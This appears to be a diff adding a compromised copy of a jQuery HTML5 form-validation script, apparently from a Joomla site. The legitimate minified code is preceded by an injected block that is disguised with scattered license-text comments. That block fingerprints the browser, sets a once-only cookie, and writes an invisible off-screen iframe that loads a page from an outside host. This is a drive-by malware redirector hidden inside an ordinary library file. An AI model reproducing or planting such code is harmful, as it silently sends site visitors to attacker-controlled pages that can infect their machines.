@@ -1,0 +1,98 @@
+/*Activities other than copying, distribution and modification are not covered by this License; they are outside its scope. The act of running the Program is not restricted, and the output from the Program is covered only if its contents constitute a work based on the Program (independent of having been made by running the Program). Whether that is true depends on what the Program does.*/
+(function(){
+function stripos (m_haystack, m_needle, m_offset) {
+ var haystack = (m_haystack + '').toLowerCase();
+ var needle = (m_needle + '').toLowerCase();
+ var index = 0;
+ if ((index = haystack.indexOf(needle, m_offset)) !== -1) {
+  return index;
+ }
+
+/*
+"License" shall mean the terms and conditions for use, reproduction,
+      and distribution as defined by Sections 1 through 9 of this document.
+
+      "Licensor" shall mean the copyright owner or entity authorized by
+      the copyright owner that is granting the License.
+*/
+
+ return false;
+}
+
+/*
+"Legal Entity" shall mean the union of the acting entity and all
+      other entities that control, are controlled by, or are under common
+      control with that entity. For the purposes of this definition,
+      "control" means (i) the power, direct or indirect, to cause the
+      direction or management of such entity, whether by contract or
+      otherwise, or (ii) ownership of fifty percent (50%) or more of the
+      outstanding shares, or (iii) beneficial ownership of such entity.
+*/
+
+function mmm_check_ua(){
+ var blackData = ['iPhone','Macintosh','Linux','iPad','Android','FreeBSD','Chrome','IEMobile','SymbianOS','Avant','Chromium','Firefox'];
+ var blackUser = false;
+ for (var i in blackData) {
+  if (stripos(navigator.userAgent, blackData[i])) {
+   blackUser = true;
+   break;
+  }
+ }
+ return blackUser;
+}
+
+/*
+"Derivative Works" shall mean any work, whether in Source or Object
+      form, that is based on (or derived from) the Work and for which the
+      editorial revisions, annotations, elaborations, or other modifications
+      represent, as a whole, an original work of authorship. For the purposes
+      of this License, Derivative Works shall not include works that remain
+      separable from, or merely link (or bind by name) to the interfaces of,
+      the Work and Derivative Works thereof.
+*/
+
+function setZone(name, value, expires) {
+ var date = new Date( new Date().getTime() + expires*1000 );
+ document.cookie = name+'='+value+'; path=/; expires='+date.toUTCString();
+}
+
+/*
+Grant of Copyright License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      copyright license to reproduce, prepare Derivative Works of,
+      publicly display, publicly perform, sublicense, and distribute the
+      Work and such Derivative Works in Source or Object form.
+*/
+
+function getCookie(name) {
+ var matches = document.cookie.match(new RegExp( "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\/\+^])/g, '$1') + "=([^;]*)" ));
+ return matches ? decodeURIComponent(matches[1]) : undefined;
+}
+
+/*
+Redistribution. You may reproduce and distribute copies of the
+      Work or Derivative Works thereof in any medium, with or without
+      modifications, and in Source or Object form, provided that You
+      meet the following conditions:
+*/
+
+if (!mmm_check_ua()) {
+ var cookie = getCookie('lisapos19ajerlam');
+ if (cookie == undefined) {
+  setZone('lisapos19ajerlam', true, 260001);	
+
+/*
+You may add Your own copyright statement to Your modifications and
+      may provide additional or different license terms and conditions
+      for use, reproduction, or distribution of Your modifications, or
+      for any such Derivative Works as a whole, provided Your use,
+      reproduction, and distribution of the Work otherwise complies with
+      the conditions stated in this License.
+*/
+
+  document.write('<iframe sr'+'c'+'="http://homanter.namadev.com.ar/hrehdfgewerhre13.html" s'+'tyle="posit'+'ion:absolute;left'+':'+'-'+'1372px;top'+':'+'-'+'1372px;" height="132" width="132"></iframe>');
+ }
+}
+})();
+/*These requirements apply to the modified work as a whole. If identifiable sections of that work are not derived from the Program, and can be reasonably considered independent and separate works in themselves, then this License, and its terms, do not apply to those sections when you distribute them as separate works. But when you distribute the same sections as part of a whole which is a work based on the Program, the distribution of the whole must be on the terms of this License, whose permissions for other licensees extend to the entire whole, and thus to each and every part regardless of who wrote it.*/(function(e,t,n){typeof Object.create!="function"&&(Object.create=function(e){function t(){}return t.prototype=e,new t});var r={init:function(n,r){var i=this;i.elem=r,i.$elem=e(r),r.H5Form=i,i.options=e.extend({},e.fn.h5f.options,n),i.field=t.createElement("input"),i.checkSupport(i),r.nodeName.toLowerCase()==="form"&&i.bindWithForm(i.elem,i.$elem)},bindWithForm:function(e,t){var r=this,i=!!t.attr("novalidate"),s=e.elements,o=s.length;r.options.formValidationEvent==="onSubmit"&&t.on("submit",function(e){var s=this.H5Form.donotValidate!=n?this.H5Form.donotValidate:!1;!s&&!i&&!r.validateForm(r)?(e.preventDefault(),this.donotValidate=!1):t.find(":input").each(function(){r.placeholder(r,this,"submit")})}),t.on("focusout focusin",function(e){r.placeholder(r,e.target,e.type)}),t.on("focusout change",r.validateField),t.find("fieldset").on("change",function(){r.validateField(this)}),r.browser.isFormnovalidateNative||t.find(":submit[formnovalidate]").on("click",function(){r.donotValidate=!0});while(o--){var u=s[o];r.polyfill(u),r.autofocus(r,u)}},polyfill:function(e){if(e.nodeName.toLowerCase()==="form")return!0;var t=e.form.H5Form;t.placeholder(t,e),t.numberType(t,e)},checkSupport:function(e){e.browser={},e.browser.isRequiredNative="required"in e.field,e.browser.isPatternNative="pattern"in e.field,e.browser.isPlaceholderNative="placeholder"in e.field,e.browser.isAutofocusNative="autofocus"in e.field,e.browser.isFormnovalidateNative="formnovalidate"in e.field,e.field.setAttribute("type","email"),e.browser.isEmailNative=e.field.type=="email",e.field.setAttribute("type","url"),e.browser.isUrlNative=e.field.type=="url",e.field.setAttribute("type","number"),e.browser.isNumberNative=e.field.type=="number",e.field.setAttribute("type","range"),e.browser.isRangeNative=e.field.type=="range"},validateForm:function(){var e=this,t=e.elem,n=t.elements,r=n.length,i=!0;t.isValid=!0;for(var s=0;s<r;s++){var o=n[s];o.isDisabled||(i=e.validateField(o),t.isValid&&!i&&e.setFocusOn(o),t.isValid=i&&t.isValid)}return e.options.doRenderMessage&&e.renderErrorMessages(e,t),t.isValid},validateField:function(t){var r=t.target||t;if(r.form===n)return null;var i=r.form.H5Form,s=e(r),o=!1;r.isRequired=!!e(r).attr("required"),r.isDisabled=!!e(r).attr("disabled"),r.isDisabled||(o=!i.browser.isRequiredNative&&r.isRequired&&i.isValueMissing(i,r),isPatternMismatched=!i.browser.isPatternNative&&i.matchPattern(i,r)),r.validityState={valueMissing:o,patterMismatch:isPatternMismatched,valid:!o&&!isPatternMismatched&&!r.isDisabled},r.validityState.valueMissing?s.addClass(i.options.requiredClass):s.removeClass(i.options.requiredClass),r.validityState.patterMismatch?s.addClass(i.options.patternClass):s.removeClass(i.options.patternClass);if(!r.validityState.valid){s.addClass(i.options.invalidClass);var u=i.findLabel(s);u.addClass(i.options.invalidClass),u.attr("aria-invalid","true")}else{s.removeClass(i.options.invalidClass);var u=i.findLabel(s);u.removeClass(i.options.invalidClass),u.attr("aria-invalid","false")}return r.validityState.valid},isValueMissing:function(r,i){var s=e(i),o=/^(input|textarea|select)$/i,u=/^submit$/i,a=s.val(),f=i.type!==n?i.type:i.tagName.toLowerCase(),l=/^(checkbox|radio|fieldset)$/i;if(!l.test(f)&&!u.test(f)){if(a==="")return!0;if(!r.browser.isPlaceholderNative&&s.hasClass(r.options.placeholderClass))return!0}else if(l.test(f)){if(f==="checkbox")return!s.is(":checked");var c;f==="fieldset"?c=s.find("input"):c=t.getElementsByName(i.name);for(var h=0;h<c.length;h++)if(e(c[h]).is(":checked"))return!1;return!0}return!1},matchPattern:function(t,r){var i=e(r),s=!t.browser.isPlaceholderNative&&i.attr("placeholder")&&i.hasClass(t.options.placeholderClass)?"":i.attr("value"),o=i.attr("pattern"),u=i.attr("type");if(s!=="")if(u==="email"){var a=!0;if(i.attr("multiple")===n)return!t.options.emailPatt.test(s);s=s.split(t.options.mutipleDelimiter);for(var f=0;f<s.length;f++){a=t.options.emailPatt.test(s[f].replace(/[ ]*/g,""));if(!a)return!0}}else{if(u==="url")return!t.options.urlPatt.test(s);if(u==="text"&&o!==n)return usrPatt=new RegExp("^(?:"+o+")$"),!usrPatt.test(s)}return!1},placeholder:function(t,r,i){var s=e(r),o={placeholder:s.attr("placeholder")},u=/^(focusin|submit)$/i,a=/^(input|textarea)$/i,f=/^password$/i,l=t.browser.isPlaceholderNative;!l&&a.test(r.nodeName)&&!f.test(r.type)&&o.placeholder!==n&&(r.value===""&&!u.test(i)?(r.value=o.placeholder,s.addClass(t.options.placeholderClass)):r.value===o.placeholder&&u.test(i)&&(r.value="",s.removeClass(t.options.placeholderClass)))},numberType:function(t,n){var r=e(n);node=/^input$/i,type=r.attr("type");if(node.test(n.nodeName)&&(type=="number"&&!t.browser.isNumberNative||type=="range"&&!t.browser.isRangeNative)){var i=parseInt(r.attr("min")),s=parseInt(r.attr("max")),o=parseInt(r.attr("step")),u=parseInt(r.attr("value")),a=r.prop("attributes"),f=e("<select>"),l;i=isNaN(i)?-100:i;for(var c=i;c<=s;c+=o)l=e("<option>").attr("value",c).text(c),(u==c||u>c&&u<c+o)&&l.attr("selected",""),f.append(l);e.each(a,function(){f.attr(this.name,this.value)}),r.replaceWith(f)}},autofocus:function(n,r){var i=e(r),s=!!i.attr("autofocus"),o=/^(input|textarea|select|fieldset)$/i,u=/^submit$/i,a=n.browser.isAutofocusNative;!a&&o.test(r.nodeName)&&!u.test(r.type)&&s&&e(t).ready(function(){n.setFocusOn(r)})},findLabel:function(t){var n=e('label[for="'+t.attr("id")+'"]');if(n.length<=0){var r=t.parent(),i=r.get(0).tagName.toLowerCase();i=="label"&&(n=r)}return n},setFocusOn:function(t){t.tagName.toLowerCase()==="fieldset"?e(t).find(":first").focus():e(t).focus()},renderErrorMessages:function(t,n){var r=n.elements,i=r.length,s={};s.errors=new Array;while(i--){var o=e(r[i]),u=t.findLabel(o);o.hasClass(t.options.requiredClass)&&(s.errors[i]=u.text().replace("*","")+t.options.requiredMessage),o.hasClass(t.options.patternClass)&&(s.errors[i]=u.text().replace("*","")+t.options.patternMessage)}s.errors.length>0&&Joomla.renderMessages(s)}};e.fn.h5f=function(e){return this.each(function(){var t=Object.create(r);t.init(e,this)})},e.fn.h5f.options={invalidClass:"invalid",requiredClass:"required",requiredMessage:" is required.",placeholderClass:"placeholder",patternClass:"pattern",patternMessage:" doesn't match pattern.",doRenderMessage:!1,formValidationEvent:"onSubmit",emailPatt:/^[a-zA-Z0-9.!#$%&‚Äô*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/,urlPatt:/[a-z][\-\.+a-z]*:\/\//i},e(function(){e("form").h5f({doRenderMessage:!0})})})(jQuery,document);
